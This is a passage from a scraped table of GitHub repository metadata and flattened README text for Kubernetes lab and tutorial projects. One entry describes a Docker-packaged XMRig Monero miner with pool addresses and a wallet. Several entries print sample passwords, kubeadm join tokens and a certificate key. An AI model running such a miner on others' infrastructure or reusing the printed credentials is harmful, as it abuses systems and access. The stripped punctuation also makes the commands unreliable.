IP address which is 10 97 xx LoadBalancer will also give the service an internal IP address and in additional an external IP minikube service mongo express service to access the external IP address To setup namespace brew install kubectx kubens How to install ingress controller in minikube minikube addons enable ingress automatically starts the K8s Nginx implementation of Ingress Controller kubectl get pod n kube system You will see the Nginx ingress controller running in your cluster NAME READY STATUS RESTARTS AGE coredns f9fd979d6 ptjz5 1 1 Running 1 24h etcd minikube 1 1 Running 1 25h ingress nginx admission create dxd8m 0 1 Completed 0 6m22s ingress nginx admission patch frrkl 0 1 Completed 0 6m22s ingress nginx controller 558664778f 8gwlp 1 1 Running 0 6m22s kube apiserver minikube 1 1 Running 1 25h kube controller manager minikube 1 1 Running 1 25h kube proxy pf5dj 1 1 Running 1 24h kube scheduler minikube 1 1 Running 1 25h storage provisioner 1 1 Running 8 25h,2020-12-20T10:18:10Z,2020-12-21T07:29:43Z,n/a,User,1,1,0,6,master,LayMui-Toh,1,0,0,0,0,0,0
masezou,k8s-study,,k8s study kubernates learning with single machine These scriput is use KIND simple K8s environment I have tested only Linux environment How to use Prepare following environment Ubuntu 20 04 1 amd64 with 2vCPU 8GB RAM 100GB HDD with Internet Connection login ubuntu server sudo i git clone this run following scripts 0 minio sh Minio Object Storage environment If you don t have object storage and starting minio with systemd 1 buildk8s sh Building KIND cluster This script will deploy single node KIND cluster 2 storage sh Install CSI hostpath environment This script will deploy CSI hostpath driver 3 wordpress sh Deploy wordpress blog site run kubectl port forward address 0 0 0 0 svc wordpress 80 80 n wordpres Then access http your Kind host ip Ubuntu IP configure wordpress blog 4 kasten sh Deploy K10 run kubectl namespace kasten io port forward address 0 0 0 0 service gateway 8080 8000 Then access https your Kind host ip Ubuntu IP 8080 k10 configure Kasten for wordpress backup If you want to wipeout wordpress run X delete wordpress sh If you want to delete KIND cluster run Y delete kind cluster sh You can re start from 1 buildk8s sh Note MySQL Application consistance is not supported in this branch for now,2020-11-19T11:24:37Z,2020-12-17T05:52:18Z,Shell,User,1,1,0,16,main,masezou,1,0,0,0,0,0,0
sanya29,fib-k8s,,,2020-09-06T10:24:02Z,2020-09-07T09:19:45Z,JavaScript,User,1,1,0,5,master,sanya29,1,0,0,0,0,0,1
err0r500,k8s-practice,,K8s practice learning path 1 core object core objects 1 configuration configuration 1 scheduling scheduling 1 cluster cluster 1 demo demo resources kubernetes documentation https kubernetes io docs home,2020-10-23T09:57:23Z,2020-11-04T16:49:23Z,Go,User,2,1,0,77,master,err0r500,1,0,0,0,0,0,0
FidelisClayton,multi-k8s,,,2020-10-14T20:40:10Z,2020-10-18T14:17:08Z,JavaScript,User,1,1,0,4,master,FidelisClayton,1,0,0,0,0,0,0
akokshar,k8s-utils,,k8s utils kubectl clean Find and remove all resources sutisfying selector If installed in a PATH can be used as kubectl plugin WARNING kubectl clean is not intended to be used manually It is deleting resources without asking for a confirmation When executed with the right parameters it will nuke the cluster dry run option is defauled to true to minimize a risk of accidentaly wiping out kubernetes cluster Usage shell kubectl clean Usage of usr local bin kubectl clean annotation filter string preserve annotated resources dry run report only default true default true kubeconfig string kubeconfig file label selector string resources to prune required namespace string limit cleanup to a particular namespace Example Create some resources and labeled with version xxx shell kubectl namespace playground apply f deploy1 yaml deployment apps test1 created kubectl namespace playground apply f deploy2 yaml deployment apps test2 created kubectl namespace playground label deployments apps test1 version 1 deployment apps test1 labeled kubectl namespace playground label deployments apps test2 version 2 deployment apps test2 labeled Find all resources labeled as version 1 shell kubectl clean label selector version 1 2020 07 29 12 55 05 Running GC with LabelSelector version 1 version AnnotationFilter 2020 07 29 12 55 07 dry run delete deployments test1 in namespace playground OK Find all resources which have label version with a value other then 1 shell kubectl clean label selector version 1 2020 07 29 13 00 30 Running GC with LabelSelector version 1 version AnnotationFilter 2020 07 29 13 00 31 dry run delete deployments test2 in namespace playground OK Do cleanup keeping only resources labeled with version 2 shell kubectl namespace playground get deployments apps show labels NAME READY UP TO DATE AVAILABLE AGE LABELS test1 1 1 1 1 12m version 1 test2 1 1 1 1 12m version 2 kubectl clean label selector version 2 dry run false 2020 07 29 13 04 14 Running GC with LabelSelector version 2 version AnnotationFilter 2020 07 29 13 04 15 delete deployments test1 in namespace playground OK kubectl namespace playground get deployments apps show labels NAME READY UP TO DATE AVAILABLE AGE LABELS test2 1 1 1 1 14m version 2,2020-11-21T15:39:33Z,2020-11-24T12:28:47Z,Go,User,1,1,0,2,master,akokshar,1,0,0,0,0,0,0
Mohammed8960,K8s-helm,,Hunger Station test it s a simple web app have the following components React JS Node JS Redis Express JS Postgres DB Nginx the application purpose is to calculate the fibonacci sequence that s a series of numbers 0 1 1 2 3 5 8 13 21 34 the 2 is found by adding the two numbers before it 1 1 the 3 is found by adding the two numbers before it 1 2 Fibonacci Sequence images fibonacci png Title Application Architecture When the customer submits a new number it will be saved in Postgres DB as well as Redis The worker component watch the new added index to redis to calculate the fibonacci result and display it Application Architecture images application architecture png Title Application Components Application Components images application components png Title Development Architecture Development Architecture images development architecture png Title Nginx Traffic Nginx Traffic images application nginx png Title Docker Compose to test the docker compose please run the following command in the application root directory docker compose up please ignore any javascript deprecated libraries then visit the following link localhost 3050 http localhost 3050 the application view should be like the following screenshot Docker Compose Result images docker compose result png Title Kubernetes Cluster Architecture Nginx Traffic images k8s cluster png Title to test the kubernetes manifest files please run the following comand in the application root directory kubectl apply f k8s get the minikube IP by running minikube ip then visit the resulted IP to get the web app the application view should be like the following screenshot Docker Compose Result images k8s result png Title Helm to test the helm chart please run the following command in the root application directory note if you still running K8s ckuster please run the following command to delete it kubectl delete f k8s helm install hungerstation helm fib get the minikube IP by running minikube ip then visit the resulted IP to get the web app the application view should be like the following screenshot Docker Compose Result images helm result png Title Thanks so much for giving me the opportunity to do the test,2020-09-21T18:48:27Z,2020-09-21T18:49:27Z,JavaScript,User,1,1,0,0,master,,0,0,0,0,0,0,0
overnightdigital,k8s-app,,,2020-11-02T14:24:29Z,2020-11-23T22:13:11Z,JavaScript,User,1,1,0,20,master,overnightdigital,1,0,0,0,0,0,0
oliverwu,k8s-yaml,,,2020-09-12T11:07:54Z,2020-11-24T23:44:37Z,n/a,User,1,1,0,1,master,oliver-au,1,0,0,0,0,0,0
kasper190,django_k8s,,djangok8s Sample guestbook app developed in django react and nginx with kubernetes deployment files k8s development Apply all the files from k8s directory shell kubectl apply f Local development In the code directory you can find docker compose files for local development Build and run shell docker compose f docker compose local yaml build docker compose f docker compose local yaml up An app is available at localhost on port 3000 or shell docker compose build docker compose up An app is available at localhost on port 80 k8s code,2020-08-31T21:57:48Z,2020-12-26T20:32:47Z,JavaScript,User,1,1,0,1,master,kasper190,1,0,0,0,0,0,0
luongnv1511,node-k8s,,,2020-09-26T06:43:41Z,2020-10-03T02:40:52Z,JavaScript,User,1,1,0,0,master,,0,0,0,0,0,0,0
AlyRagab,k8s-gatekeeper,,k8s gatekeeper Applying examples of Open Policy Agent Gatekeeper into Kubernetes Normally we have two parts of Authorisations User level and Resources level User Level implemented by the RBAC permissions Resources Level implemented by the OPA So let s see how it works Flow and Arch It is working as Admission Controller which let s the API Server validates the kubectl API Request etc and checks if there is any policy applied against this related k8s resource or no OPA is deployed as a CRD We create a Policy template by a Rego Language Then we create a Constraint which will consume the previously created Policy template OPA vs Gatekeeper OPA is a general Policy Agent which can be applied in many things Gatekeeper is just specific for Kubernetes and it actually uses OPA internally Both OPA and Gatekeeper are using the Rego Policy Language Setup of Gatekeeper kubectl apply f gatekeeper crd yaml Included in this repo policies examples of running OPA in Kubernetes,2020-11-14T01:52:58Z,2020-11-15T12:23:17Z,n/a,User,1,1,0,12,main,AlyRagab,1,0,0,0,0,0,0
victormenegusso,estudo-k8s,,,2020-10-04T21:59:59Z,2020-10-16T19:34:05Z,n/a,User,1,1,0,0,master,,0,0,0,0,0,0,0
Ansah7,K8s_Learnings,,Great reference example K8s yamls for Devops Engineers Developers and System Administrators Updates on K8s yamls will be posted daily,2020-09-16T19:54:17Z,2020-09-16T20:12:37Z,n/a,User,1,1,0,3,master,Ansah7,1,0,0,0,0,0,1
npawelek,k8s-gitops,,,2020-10-04T20:15:44Z,2020-12-27T16:05:10Z,n/a,User,1,1,0,103,master,npawelek,1,0,1,0,0,0,0
bartvanbenthem,k8s-credsync,,k8s credsync generate and synchronise basic auth credentials for all tenants with the authentication proxy min requirements credsync the tenant secret name to scan is set with an environment variable there is one tenant secret per namespace to scan the tenant user name should always be identical with the tenant namespace name the auth proxy secret name to scan is set with an environment variable There is a single secret per cluster regarding the auth proxy the credsync service watches the cluster for new namespaces if the tenant password is empty a random password is first generated and added to the tenant secret on the cluster if the tenant secret is not registered in the auth proxy secret the auth proxy is updated when a tenant password does not match the auth proxy password the auth roxy is updated grafana datasource requiremenst grafana organisation names must always match the tenants namespace name and auth proxy orgid grafana datasource configurations need to be created or updated with the credentials from the auth proxy secret technical choices go client sdk is used to interract with the kubernetes API a kubernetes service account is used to athenticate and authorize the credsync service proxy service needs to be restarted after config update,2020-12-25T13:06:22Z,2020-12-29T12:37:46Z,Go,User,1,1,0,24,main,bartvanbenthem,1,0,0,0,0,0,0
shlomimn,k8s-nodejs,,k8s nodejs Task Write all necessary Kubernetes files to deploy a simple NodeJS process to the cluster General All yaml files create the required deployment I have concatinated all yaml files in the correct applying order using kustomization yaml apiVersion kustomize config k8s io v1beta1 kind Kustomization resources namespace yaml secrets yaml deployment yaml service yaml hpa yaml Execution Run the following commands to apply all yaml files kubectl kustomization allInOne yaml kubectl apply f allInOne yaml Entire Solution Overview Switch to api servers namespace kubectl config set context current namespace api servers Present complete solution kubectl get all NAME READY STATUS RESTARTS AGE pod nodejs deploy 8598bb797b 4m6j4 0 1 ErrImagePull 0 4h1m pod nodejs deploy 8598bb797b bxbd6 0 1 ImagePullBackOff 0 4h1m NAME TYPE CLUSTER IP EXTERNAL IP PORT S AGE service nodejs deploy LoadBalancer 100 68 31 81 a51fe584f628b4a68a3d35fd680c65bc 112392756 us east 1 elb amazonaws com 80 32103 TCP 4h1m NAME READY UP TO DATE AVAILABLE AGE deployment apps nodejs deploy 0 2 2 0 4h1m NAME DESIRED CURRENT READY AGE replicaset apps nodejs deploy 8598bb797b 2 2 0 4h1m NAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGE horizontalpodautoscaler autoscaling nodejs deploy Deployment nodejs deploy 80 2 10 2 4h1m Notes No need to use a real repo No need to build the docker image Thus Docker image nodejs api will not be pulled ErrImagePull Requirements Details 1 The API should be accessible inside the cluster on port 8000 deployment yaml spec template spec containers ports containerPort 8000 service yaml spec ports targetPort 8000 As shown above AWS provides the ELB loadBalancer 2 The API should be accessible from outside the cluster on port 80 service yaml spec ports port 80 service yaml spec type LoadBalancer Since I only have a single service then I can use type LoadBalancer Ingress is also an option with relevant configuration but ingress is when using a single LoadBalancer for many services 3 Minimum of 2 replicas and max unavailable 2 When we use the HPA we need to remove the number of replicas of the deployment pod replicaset Because the number of replicas is set by the HPA Controller hpa yaml spec minReplicas 2 deployment yaml spec strategy type RollingUpdate deployment yaml spec strategy rollingUpdate maxUnavailable 2 An optional field that specifies the maximum number of Pods that can be unavailable during the update process 4 Reference for secret file docker registry secret assume that secret is already exists docker registry secret txt I have create docker registry secret txt file locally includes a single password inside root shlomime k8s cat docker registry secret VeryStr0ngSecret1 secret yaml db secrets I encrepted the password in base64 and transfered it into secret yaml kubectl create secret generic db secrets from file docker registry secret o yaml namespace api servers root shlomime k8s kubectl get secrets NAME TYPE DATA AGE db secrets Opaque 1 12s Another option was to set the docker registry secret txt file outside the cluster and use volume attachement deployment yaml secret yaml In deployment yaml I configured an env section which sets the above password as a env parameter Bellow you can see that the container gets the env parameter when replacing the nodejs api image with nginx image root shlomime k8s kubectl get pod NAME READY STATUS RESTARTS AGE my deploy 848d7d4865 4rmjn 1 1 Running 0 51s my deploy 848d7d4865 nsn9h 1 1 Running 0 51s root shlomime k8s root shlomime k8s root shlomime k8s kubectl exec it my deploy 848d7d4865 4rmjn bash kubectl exec POD COMMAND is DEPRECATED and will be removed in a future version Use kubectl exec POD COMMAND instead root my deploy 848d7d4865 4rmjn echo SECRETPASSWORD VeryStr0ngSecret1 root my deploy 848d7d4865 4rmjn 5 The pod should belong to the api servers namespace Relevant file namespace yaml All yaml files include namespace api server in metadata 6 The API will horizontally auto scale when the CPU reaches 80 Pre request Verify that metrics server is installed kubectl get deployment metrics server n kube system hpa yaml apiVersion autoscaling v2beta2 hpa yaml spec metrics averageUtilization 80,2020-11-02T12:43:29Z,2020-11-07T08:44:51Z,n/a,User,1,1,0,75,main,shlomimn,1,0,0,0,0,0,0
marinamcculloch,k8s-lockdown,,k8s lockdown 1 Only 10 lessons 2 Learn k8s for 5 10 mins for ten days during lockdown 3 You ll come out of lockdown with a little more knowledge on k8s 4 Everyone s happy prerequisites Basic understanding of containers docker and shell bash Docker installed on your machine Docker Desktop for Mac Windows etc Basic knowledge of computer systems networking and software development,2020-11-05T19:27:30Z,2020-11-12T00:20:29Z,n/a,User,1,1,0,21,main,marinamcculloch,1,0,0,0,0,0,0
nawed005,kubernetes-k8s,,Kubernetes Scripts Pods Services and Deployments Scripts,2020-10-30T09:06:32Z,2020-11-11T15:27:54Z,Dockerfile,User,1,1,0,4,master,nawed005,1,0,0,0,0,0,0
wangtingwei1995,mqtt-k8s,,,2020-10-20T08:34:16Z,2020-10-20T08:41:24Z,n/a,User,1,1,0,0,master,,0,0,0,0,0,0,0
adrianchifor,incognito-k8s,,incognito k8s Incognito https incognito org virtual nodes https we incognito org t how to host a virtual node 194 management on Kubernetes using Kapitan https kapitan dev Install pip3 install user kapitan Prerequisites VMs setup and Kubernetes cluster up and running Setup kapitan compile Compiled uptimerobot 0 11s Compiled aws 0 15s Compiled private 0 31s tree LICENSE README md compiled aws manifests node4hostdeployment yml node4pvc yml private manifests node1pvc yml node1tunnelconfigmap yml node1tunneldeployment yml node1tunnelsecret yml node2pvc yml node2tunnelconfigmap yml node2tunneldeployment yml node2tunnelsecret yml node3pvc yml node3tunnelconfigmap yml node3tunneldeployment yml node3tunnelsecret yml uptimerobot terraform node1uptimerobotmonitor tf json node2uptimerobotmonitor tf json node3uptimerobotmonitor tf json node4uptimerobotmonitor tf json uptimerobotprovider tf json components incognito init py configmap yml deploymenthost yml deploymenttunnel yml pvc yml resources py secret yml tunnel sh j2 uptimerobot init py resources py inventory classes common yml targets aws yml private yml uptimerobot yml refs ssh key uptimerobot api key Examples Pods exposed as host ports on public cloud cluster aws yml inventory targets aws yml using incognito component components incognito compiles to compiled aws manifests compiled aws manifests Apply with kubectl apply f compiled aws manifests Tunneled pods on private cluster to a public VM private yml inventory targets private yml using incognito component components incognito compiles to compiled private manifests compiled private manifests Makes use of an encrypted SSH key refs ssh key to SSH tunnel to a public VM Apply with kapitan refs reveal f compiled private manifests kubectl apply f UptimeRobot https uptimerobot com alerts setup with Terraform uptimerobot yml inventory targets uptimerobot yml using uptimerobot component components uptimerobot compiles to compiled uptimerobot terraform compiled uptimerobot terraform Makes use of an encrypted API key refs uptimerobot api key for authenticate with UptimeRobot API Decrypt provider before applying kapitan refs reveal f compiled uptimerobot terraform uptimerobotprovider tf json Apply with terraform apply compiled uptimerobot terraform Public VM setup for tunneling Using fresh Ubuntu on a cloud provider of your choice bash Check updates and patch apt update apt upgrade y Add fail2ban to limit SSH spam apt install fail2ban y Create incognito user adduser disabled password incognito Enable SSH gateway ports sed i s GatewayPorts no GatewayPorts yes g etc ssh sshdconfig systemctl restart ssh Add SSH key to incognito user su incognito mkdir ssh echo ssh authorizedkeys chown R incognito incognito ssh authorizedkeys chmod 600 ssh authorizedkeys chmod 700 ssh reboot and it s good to go Don t forget to add your SSH key to refs ssh key and set your VM public IP in inventory,2020-10-19T20:52:08Z,2020-11-30T21:31:34Z,Python,User,1,1,0,4,master,adrianchifor,1,0,0,0,0,0,0
mehyedes,nodejs-k8s,,NodeJS on k8s This is a tiny Hello world app written in NodeJS for Kubernetes This README includes the necessary instructions to deploy the app along with its dependencies on a Minikube kubernetes cluster Prerequisistes The following tools must be installed in order to be able to deploy the setup Minikube Docker kubectl Helm Clone the repository First things first we need to clone this repository on our local machine bash git clone https github com mehyedes nodejs k8s git cd nodejs k8s Prepare the minikube cluster Make sure that the minikube cluster is started with the flag vm true because we will need to enable the ingress addon bash minikube start vm true Enable the ingress addon bash minikube addons enable ingress To be able to access the services deployed on minikube later we need to start by adding an entry to the etc hosts file with the following command bash echo minikube ip jenkins default local hello dev local hello prod local sudo tee a etc hosts Run the app This section provides instructions for running the app on Minikube The following guides describe 2 different ways to deploy the nodejs k8s app on Minikube Manual Setup docs manual setup md provides step by step instructions to build and deploy the app manually to Minikube Automated CI CD Setup docs automated setup md provides instructions for an automated CI CD setup where Jenkins is deployed and then used to build and deploy the application to Minikube Cleaning up Simple run the cleanup sh script to delete any resources created in Minikube,2020-10-27T16:58:38Z,2020-11-13T21:18:15Z,HTML,User,1,1,0,15,main,mehyedes,1,0,0,0,0,0,0
cliu7516,vagrant-k8s,,vagrant k8s A handy tool to create a kubernets cluster for dev environment hosted by virtualbox Prerequisites To run this tool you need to install the following softwares Oracle VirtialBox The version tested was 6 1 See https www virtualbox org Vagrant The version tested was 2 2 10 See https www vagrantup com Ansible The version tested was 2 10 3 See https www ansible com How to use Download this repo To initialize the k8s cluster run the following command under the repo directory vagrant up Once the cluster is generated you ll see 1 master node and 2 worker nodes generated You can use the following command to SSH to master node and use the cluster vagrant ssh master 1 Please try not to use vagrant halt to stop VMs as once VMs are shutdown the cluster is gone A more pratical approch would be use vagrant suspend to save the state of VMs To resume VMs use vagrant resume and after all VMs are resumed you can continue using the cluster To destroy the cluster and all the VMs use vagrant destroy,2020-11-22T17:03:11Z,2020-11-23T14:55:14Z,n/a,User,1,1,0,1,main,cliu7516,1,0,0,0,0,0,0
theJaxon,K8s-Vagrant,centos8#docker#kubernetes#kubernetes-cluster#vagrant,K8s Vagrant Kubeadm https img shields io badge Kubeadm 326CE5 style for the badge logo Kubernetes logoColor white Vagrant https img shields io badge Vagrant 1563FF style for the badge logo Vagrant logoColor white CentOS https img shields io badge CentOS 262577 style for the badge logo CentOS logoColor white Ansible https img shields io badge ansible C9284D style for the badge logo ansible logoColor white Deploy kubernetes cluster using Kubeadm Vagrant Multi machine The stable and recommended setup is in the directory centos 7 By default the setup uses 3 machines as follows Machine Address FQDN kmaster 172 42 42 100 kmaster example com kworker1 172 42 42 101 kworker1 example com kworker2 172 42 42 102 kworker2 example com CentOS 8 WIP The script was modified to support bento centos 8 image instead of centos 7 Added metrics server with the fix https github com kubernetes sigs metrics server issues 278 to support CentOS 8 AnsiblePort directory contains the same setup but using ansible Credit goes to exxactcorp and their tutorial Building Kubernetes cluster using vagrant https blog exxactcorp com building a kubernetes cluster using vagrant The source of the files can be found at bitbucket https bitbucket org exxsyseng k8scentos src master vagrant provisioning,2020-09-01T01:47:19Z,2020-11-25T10:54:06Z,Shell,User,1,1,0,26,master,theJaxon,1,0,0,0,0,0,0
debata,k8s-lab,,k8s lab Personal set of Kubernetes templates,2020-12-02T00:11:00Z,2020-12-17T15:35:37Z,Shell,User,1,1,0,12,main,debata,1,0,0,0,0,0,0
lingsamuel,k8s-book,,,2020-11-05T09:16:52Z,2020-11-16T08:15:12Z,HTML,User,1,1,0,24,master,lingsamuel,1,0,0,0,0,0,0
Lboncich,Multi-K8s,,,2020-09-18T23:03:42Z,2020-09-22T01:29:33Z,JavaScript,User,1,1,0,16,master,Lboncich,1,0,0,0,0,0,1
devendersingh2801,k8s-project,,,2020-10-15T04:13:10Z,2020-10-15T10:49:47Z,n/a,User,1,1,1,29,main,devendersingh2801,1,0,0,0,0,0,0
forbidden-realms,k8s-miner,,alpine xmrig XMRig miner https github com xmrig xmrig in an Alpine Linux Docker image The goal of this project is to quickly enable you to mine Monero without the hassle of knowing how to install or secure your mining software Using an Alpine Linux https www alpinelinux org container you get a very lightweight image 4MB and the benefit of Alpine Linux s security model I have also configured this image to run the miner as a dedicated restricted user How to use bash docker run restart unless stopped read only m 50M c 512 najahi k8s miner o POOL01 o POOL02 u WALLET p PASSWORD k docker run restart unless stopped read only m 50M c 512 najahi k8s miner o pool supportxmr com 7777 o xmr eu dwarfpool com 8005 u 468gav9azL4aosmKjoTM58FMnQksszMbx8HH45ZBbZWPANAcZhaKv7wCwLSySg39sTK4Tm4Vp834RQXZCPsx1F3ZU7Wnw4w p x k Docker Arguments restart unless stopped If the miner crashes we want the docker service to restart it read only This image does not need rw access If there are bug exploits in the pool software you are a little more protected m 50M Restricts memory usage to 50MB c 512 By default XMRig will use half of your cores Setting a relevant share count will protect you from a runaway process locking your system XMRig Arguments help All standard XMRig arguments are supported using help will list all of them bash docker run najahi k8s miner help t When manually setting threads with t you need to configure the correct CPU shares for docker IE if you have 4 cores each core is worth 256 1024 4 and so to use 3 threads CPU shares will need to be set to 756 bash docker run c 756 najahi k8s miner t 3 Donations XMR 468gav9azL4aosmKjoTM58FMnQksszMbx8HH45ZBbZWPANAcZhaKv7wCwLSySg39sTK4Tm4Vp834RQXZCPsx1F3ZU7Wnw4w,2020-10-22T20:11:56Z,2020-10-23T04:14:14Z,Dockerfile,Organization,0,1,0,1,master,najahiiii,1,0,0,0,0,0,0
yuhuashi200,k8s_test,,,2020-11-26T14:21:27Z,2020-11-26T14:52:55Z,n/a,User,1,1,0,0,main,,0,0,0,0,0,0,0
yoghurtpower,k8s_auto,,k8sauto,2020-09-24T08:28:58Z,2020-12-10T15:44:52Z,Ruby,User,1,1,0,1,master,yoghurtpower,1,0,0,0,0,0,0
motionlife,k8s-jhub,,k8s jhub UI customization for JupyterHub deployed on Kubernetes,2020-09-30T07:13:51Z,2020-12-29T07:09:09Z,HTML,User,1,1,0,43,master,motionlife,1,0,0,0,0,0,0
acteq,k8s-mirror,,k8s mirror webhook webhookkubernetes pod deployment imageimage deploy deployment yml image apiVersion v1 kind ConfigMap metadata name mirror webhook config data conf hcl mirror gcr io registry aliyuncs com googlecontainers k8s gcr io registry aliyuncs com googlecontainers kubectl apply f deploy deployment yml k8s gcr io busybox kubectl apply f test pod yml kubectl apply f test deployment yml kubeadm k8s kubeadm kubernetesk8s gcr io kubeadmin registry aliyuncs com googlecontainers kubeadm init apiserver advertise address 10 0 52 13 image repository registry aliyuncs com googlecontainers kubernetes version v1 13 3 service cidr 10 1 0 0 16 pod network cidr 10 244 0 0 16,2020-08-16T03:52:11Z,2020-09-03T10:26:08Z,Go,User,1,1,0,19,master,acteq,1,0,0,0,0,0,0
MoretS,decidim-k8s,,decidim k8s Free Open Source participatory democracy citizen participation and open government for cities and organizations This is the open source repository for decidim k8s based on Decidim https github com decidim decidim Setting up the application You will need to do some steps before having the app working properly once you ve deployed it 1 Open a Rails console in the server bundle exec rails console 2 Create a System Admin user ruby user Decidim System Admin new email password passwordconfirmation user save 3 Visit system and login with your system admin credentials 4 Create a new organization Check the locales you want to use for that organization and select a default locale 5 Set the correct default host for the organization otherwise the app will not work properly Note that you need to include any subdomain you might be using 6 Fill the rest of the form and submit it You re good to go Setting up the Docker config Build the Docker containers with the docker compose config shell script docker compose up Check that the containers are correctly started shell script docker compose logs Create database and run migrations shell script docker compose exec app bundle exec rake db setup db migrate Go to http localhost 3000 To shutdown containers run shell script docker compose down If you need to access to the Rails console run shell script docker compose exec app bundle exec rails c If a change is made in the Gemfile it is necessary to delete the Docker volume and reload the docker compose configuration shell script docker volume prune docker compose up,2020-10-31T17:08:03Z,2020-11-03T02:33:48Z,Ruby,User,2,1,0,7,main,MoretS,1,0,0,0,0,0,0
joshiomkarj,k8s-presentations,,Repo that holds presentations on k8s,2020-11-09T19:26:37Z,2020-11-10T22:38:55Z,Shell,User,2,1,0,4,master,joshiomkarj,1,0,0,0,0,0,3
voilet,saltstack-k8s,,SaltStackKubernetes kubeadm HA Kubernetes v1 13kubeadmkubeadmSaltStack Release v1 19 3 HA CentOS 8 2 salt ssh 3000 3 kubernetes v1 19 3 docker ce 19 03 13 Kubernetes 1 16APIdaemonsets deployments replicasetsAPIextensions v1beta1apps v1YAML Kubernetes 1 18 CHANGELOG https github com kubernetes kubernetes blob master CHANGELOG 1 18 md 1 Salt Grains 2 Salt Pillar 3 Salt SSHAgent 4 Kubernetesv1 18 3 Github 252370310 DockerKubernetes http k8s unixhot com 1 1 1 root linux node1 vim etc hostname linux node1 example com root linux node2 vim etc hostname linux node2 example com root linux node3 vim etc hostname linux node3 example com 1 2 etc hosts root linux node1 vim etc hosts 127 0 0 1 localhost localhost localdomain localhost4 localhost4 localdomain4 1 localhost localhost localdomain localhost6 localhost6 localdomain6 192 168 56 11 linux node1 linux node1 example com 192 168 56 12 linux node2 linux node2 example com 192 168 56 13 linux node3 linux node3 example com 1 3 SELinux root linux node1 vim etc sysconfig selinux SELINUX disabled disabled 1 4 NetworkManager root linux node1 systemctl stop firewalld systemctl disable firewalld root linux node1 systemctl stop NetworkManager systemctl disable NetworkManager 2 Salt SSH 2 1 SSH bash root linux node1 ssh keygen t rsa root linux node1 ssh copy id linux node1 root linux node1 ssh copy id linux node2 root linux node1 ssh copy id linux node3 2 2 Salt SSHSalt SSHRosterGrains2017 7 4 root linux node1 wget O etc yum repos d epel repo http mirrors aliyun com repo epel 7 repo root linux node1 yum install y https mirrors aliyun com saltstack yum redhat salt repo latest 2 el7 noarch rpm root linux node1 sed i s repo saltstack com mirrors aliyun com saltstack g etc yum repos d salt latest repo root linux node1 yum install y salt ssh git unzip 2 3 srv root linux node1 git clone https github com unixhot salt kubeadm git root linux node1 cd salt kubeadm root linux node1 cp r srv root linux node1 srv bin cp srv roster etc salt roster root linux node1 srv bin cp srv master etc salt master 3 Salt SSH KubernetesMaster root linux node1 vim etc salt roster linux node1 host 192 168 56 11 user root priv root ssh idrsa minionopts grains k8s role master linux node2 host 192 168 56 12 user root priv root ssh idrsa minionopts grains k8s role node linux node3 host 192 168 56 13 user root priv root ssh idrsa minionopts grains k8s role node k8s role K8S KubernetesMaster root linux node1 vim etc salt roster linux node1 host 192 168 56 11 user root priv root ssh idrsa minionopts grains k8s role master linux node2 host 192 168 56 12 user root priv root ssh idrsa minionopts grains k8s role master linux node3 host 192 168 56 13 user root priv root ssh idrsa minionopts grains k8s role node 4 Salt Pillar root linux node1 vim srv pillar k8s sls Kubernetes K8SVERSION 1 18 3 VIP MASTERVIP 192 168 56 10 MasterIP MASTERIP 192 168 56 11 Grains FQDNIPIP NODEIP grains fqdnip4 0 Service IP SERVICECIDR 10 1 0 0 16 Kubernetes IP SERVICECIDR CLUSTERKUBERNETESSVCIP 10 1 0 1 Kubernetes DNS IP SERVICECIDR CLUSTERDNSSVCIP 10 1 0 2 Node Port NODEPORTRANGE 20000 40000 PODIP PODCIDR 10 2 0 0 16 DNS CLUSTERDNSDOMAIN cluster local 5 Master 5 1 Salt SSH root linux node1 salt ssh i test ping linux node2 True linux node3 True linux node1 True True 5 2 K8S SWAP root linux node1 salt ssh r swapoff a root linux node1 salt ssh state highstate 5YAMLFailed0 Summary for linux node3 Succeeded 19 changed 19 Failed 0 Total states run 19 Total run time 733 939 s 5 3 Master 1 Master Kubeadmkubeletdockeryamlkubeadm 1CPU ignore preflight errors NumCPU kubeadm ymlkubeadmIPVS etc sysconfig kubeadm yml root linux node1 kubeadm init config etc sysconfig kubeadm yml ignore preflight errors NumCPU Kubernetesdocker images 2 Master root linux node1 kubeadm init config etc sysconfig kubeadm ha yml upload certs ignore preflight errors NumCPU 5 4 kubectl kubectl kube config root linux node1 mkdir p HOME kube root linux node1 cp i etc kubernetes admin conf HOME kube config root linux node1 chown id u id g HOME kube config 5 5 Master You can now join any number of the control plane node running the following command on each as root kubeadm join 192 168 56 10 8443 token abcdef 0123456789abcdef discovery token ca cert hash sha256 e1faf2d489ff739544b3b46a5ced36a1e51b550b6d3ef9f8b29681bd1ae3bbb1 control plane certificate key c725f2793006a655dc381e9ee4cb8bc9ab09d148ea8d54475e815c99f5ac2051 Please note that the certificate key gives access to cluster sensitive data keep it secret As a safeguard uploaded certs will be deleted in two hours If necessary you can use kubeadm init phase upload certs upload certs to reload certs afterward 5 6 Flannel Nodeeth0 iface eth0 root linux node1 kubectl create f etc sysconfig kube flannel yml 5 7 1 Master root linux node1 kubeadm token create print join command kubeadm join 192 168 56 11 6443 token qnlyhw cr9n8jbpbkg94szj discovery token ca cert hash sha256 cca103afc0ad374093f3f76b2f91963ac72eabea3d379571e88d403fc7670611 2 Node linux node2 example com root linux node2 kubeadm join 192 168 56 11 6443 token qnlyhw cr9n8jbpbkg94szj discovery token ca cert hash sha256 cca103afc0ad374093f3f76b2f91963ac72eabea3d379571e88d403fc7670611 linux node3 example com root linux node3 kubeadm join 192 168 56 11 6443 token qnlyhw cr9n8jbpbkg94szj discovery token ca cert hash sha256 cca103afc0ad374093f3f76b2f91963ac72eabea3d379571e88d403fc7670611 6 Kubernetes root linux node1 kubectl get cs NAME STATUS MESSAGE ERROR controller manager Healthy ok scheduler Healthy ok etcd 0 Healthy health true root linux node1 kubectl get node NAME STATUS ROLES AGE VERSION 192 168 56 11 Ready master 1m v1 18 3 192 168 56 12 Ready 1m v1 18 3 192 168 56 13 Ready 1m v1 18 3 7 KubernetesFlannel 1 Pod root linux node1 kubectl run net test image alpine sleep 360000 deployment net test created 2 root linux node1 kubectl get pod o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES net test 1 1 Running 0 22s 10 2 12 2 linux node2 example com 3 pingKubernetes root linux node1 ping c 1 10 2 12 2 PING 10 2 12 2 10 2 12 2 56 84 bytes of data 64 bytes from 10 2 12 2 icmpseq 1 ttl 61 time 8 72 ms 10 2 12 2 ping statistics 1 packets transmitted 1 received 0 packet loss time 0ms rtt min avg max mdev 8 729 8 729 8 729 0 000 ms 1 